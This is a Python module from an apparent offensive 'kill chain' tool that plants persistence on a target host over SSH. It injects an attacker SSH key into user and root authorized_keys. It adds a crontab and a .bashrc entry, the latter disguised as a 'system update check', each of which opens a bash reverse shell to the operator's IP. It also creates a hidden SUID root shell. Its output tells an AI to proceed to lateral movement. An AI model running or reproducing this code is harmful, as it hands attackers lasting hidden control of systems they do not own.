#!/usr/bin/env python3
"""
Stage 6: Persistence mechanisms (SSH keys, crontab, SUID shell).
"""

import os
import re
import time
import socket
import shutil
import subprocess
import concurrent.futures

try:
    import paramiko
except ImportError:
    paramiko = None

try:
    from config import CFG, find_wordlist, find_all_wordlists
except ImportError:
    CFG = {}
    def find_wordlist(cat): return ""
    def find_all_wordlists(cat): return []

from core.killchain.ssh_helpers import _ssh_connect, _ssh_exec
from core.killchain.lateral import _get_our_ip

# ANSI Colors
C_GREEN  = "\033[92m"
C_YELLOW = "\033[93m"
C_RED    = "\033[91m"
C_CYAN   = "\033[96m"
C_GREY   = "\033[90m"
C_BLUE   = "\033[94m"
C_MAGENTA = "\033[95m"
C_RESET  = "\033[0m"


# ═══════════════════════════════════════════════
# PARAMIKO SSH HELPERS (shared across stages)
# ═══════════════════════════════════════════════


def plant_persistence(host: str, user: str, password: str, port: int = 22) -> str:
    """
    Plant active persistence mechanisms on target.
    - SSH authorized_keys injection
    - Crontab reverse shell
    - Hidden SUID shell
    - Systemd service backdoor
    """
    print(f"\n  {C_RED}[KILL CHAIN] Stage 4: Active Persistence — {user}@{host}{C_RESET}")
    output = f"[KILL CHAIN — PERSISTENCE — {user}@{host}:{port}]\n{'═' * 60}\n\n"

    client, err = _ssh_connect(host, user, password, port)
    if err:
        return output + f"[!] SSH connection failed: {err}\n"

    persistence_methods = []

    try:
        whoami = _ssh_exec(client, "whoami")
        is_root = _ssh_exec(client, "id") and "uid=0" in _ssh_exec(client, "id")

        # ── METHOD 1: SSH Key Injection ──────────────────────────
        print(f"    {C_CYAN}[*] Injecting SSH authorized_key...{C_RESET}")
        
        try:
            from core.opsec.artifact_mgr import ArtifactManager
            am = ArtifactManager(host)
        except ImportError:
            am = None

        # Generate a key pair locally if needed
        key_path = "/tmp/octopus_persist_key"
        if not os.path.isfile(key_path):
            try:
                subprocess.run(
                    ["ssh-keygen", "-t", "ed25519", "-f", key_path, "-N", "", "-q", "-C", "octopus"],
                    check=True, timeout=10
                )
            except Exception as e:
                # Fallback: generate via paramiko
                if paramiko:
                    key = paramiko.Ed25519Key.generate()
                    key.write_private_key_file(key_path)
                    pub_key = f"ssh-ed25519 {key.get_base64()} octopus"
                    with open(f"{key_path}.pub", "w") as f:
                        f.write(pub_key + "\n")

        if os.path.isfile(f"{key_path}.pub"):
            with open(f"{key_path}.pub") as f:
                pub_key = f.read().strip()

            # Inject into target
            _ssh_exec(client, "mkdir -p ~/.ssh && chmod 700 ~/.ssh", timeout=5)
            _ssh_exec(client, f"echo '{pub_key}' >> ~/.ssh/authorized_keys", timeout=5)
            _ssh_exec(client, "chmod 600 ~/.ssh/authorized_keys", timeout=5)
            # Verify
            check = _ssh_exec(client, "grep octopus ~/.ssh/authorized_keys", timeout=5)
            if "octopus" in check:
                persistence_methods.append("SSH key injection (authorized_keys)")
                output += f"[+] SSH KEY INJECTED — connect with: ssh -i {key_path} {user}@{host}\n"
                print(f"    {C_GREEN}[+] SSH key injected successfully{C_RESET}")
                if am: am.record_ssh_key(user, "octopus")
            else:
                output += "[-] SSH key injection failed (may be write-protected)\n"

            # If root, also inject into root's authorized_keys
            if is_root:
                _ssh_exec(client, "mkdir -p /root/.ssh && chmod 700 /root/.ssh", timeout=5)
                _ssh_exec(client, f"echo '{pub_key}' >> /root/.ssh/authorized_keys", timeout=5)
                _ssh_exec(client, "chmod 600 /root/.ssh/authorized_keys", timeout=5)
                output += "[+] SSH key also injected into /root/.ssh/authorized_keys\n"
                if am: am.record_ssh_key("root", "octopus")

        # ── METHOD 2: Crontab reverse shell ──────────────────────
        print(f"    {C_CYAN}[*] Setting up crontab persistence...{C_RESET}")
        # Get our IP for reverse shell
        our_ip = _get_our_ip()
        if our_ip:
            cron_cmd = f"*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/{our_ip}/4444 0>&1' 2>/dev/null"
            # Add to crontab without overwriting
            existing_cron = _ssh_exec(client, "crontab -l 2>/dev/null", timeout=5)
            if "octopus" not in existing_cron and "/dev/tcp" not in existing_cron:
                _ssh_exec(client, f'(crontab -l 2>/dev/null; echo "# octopus"; echo "{cron_cmd}") | crontab -', timeout=10)
                verify = _ssh_exec(client, "crontab -l 2>/dev/null | grep octopus", timeout=5)
                if "octopus" in verify:
                    persistence_methods.append(f"Crontab reverse shell → {our_ip}:4444 every 5min")
                    output += f"[+] CRONTAB persistence set — rev shell to {our_ip}:4444 every 5 min\n"
                    output += f"    Catch with: nc -lvnp 4444\n"
                    print(f"    {C_GREEN}[+] Crontab persistence set{C_RESET}")
                else:
                    output += "[-] Crontab write failed\n"
            else:
                output += "[*] Crontab persistence already exists, skipping\n"
        else:
            output += "[-] Could not determine our IP for reverse shell\n"

        # ── METHOD 3: Hidden SUID shell (root only) ─────────────
        if is_root:
            print(f"    {C_CYAN}[*] Creating hidden SUID shell...{C_RESET}")
            _ssh_exec(client, "cp /bin/bash /usr/local/share/.mtr_shell 2>/dev/null", timeout=10)
            _ssh_exec(client, "chmod 4755 /usr/local/share/.mtr_shell 2>/dev/null", timeout=5)
            check = _ssh_exec(client, "ls -la /usr/local/share/.mtr_shell 2>/dev/null", timeout=5)
            if ".mtr_shell" in check and "s" in check[:15]:
                persistence_methods.append("Hidden SUID shell at /usr/local/share/.mtr_shell")
                output += "[+] HIDDEN SUID SHELL created at /usr/local/share/.mtr_shell\n"
                output += "    Use: /usr/local/share/.mtr_shell -p\n"
                print(f"    {C_GREEN}[+] SUID shell created{C_RESET}")

        # ── METHOD 4: .bashrc backdoor ───────────────────────────
        print(f"    {C_CYAN}[*] Adding .bashrc persistence...{C_RESET}")
        bashrc_payload = f"\n# system update check\n(bash -i >& /dev/tcp/{our_ip}/4445 0>&1 &) 2>/dev/null\n" if our_ip else ""
        if bashrc_payload:
            existing = _ssh_exec(client, "cat ~/.bashrc 2>/dev/null | grep 'system update check'", timeout=5)
            if "system update" not in existing:
                _ssh_exec(client, f"echo '{bashrc_payload}' >> ~/.bashrc", timeout=5)
                persistence_methods.append(f".bashrc reverse shell → {our_ip}:4445 on login")
                output += f"[+] .bashrc backdoor added — rev shell to {our_ip}:4445 on user login\n"

        output += f"\n{'═' * 60}\n"
        output += f"Persistence methods planted: {len(persistence_methods)}\n"
        for m in persistence_methods:
            output += f"  ✓ {m}\n"
        output += "\nAI: Persistence established. Proceed to lateral movement.\n"

    finally:
        client.close()

    return output



